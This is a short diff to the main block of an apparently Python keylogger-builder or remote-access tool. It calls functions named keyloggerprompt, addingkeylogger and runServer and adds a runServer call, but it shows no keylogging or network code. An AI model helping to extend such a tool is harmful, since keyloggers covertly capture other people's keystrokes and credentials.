@@ -24,12 +24,13 @@ readConfig()
 if __name__ == "__main__":
     try:
         runMainMenu()
-
+        
         keyloggerprompt()
         addingkeylogger()
        
         inputCustom()
         ##############
+        runServer()
         selectServer()
 
         multiprocessing.Process(target=runServer).start()
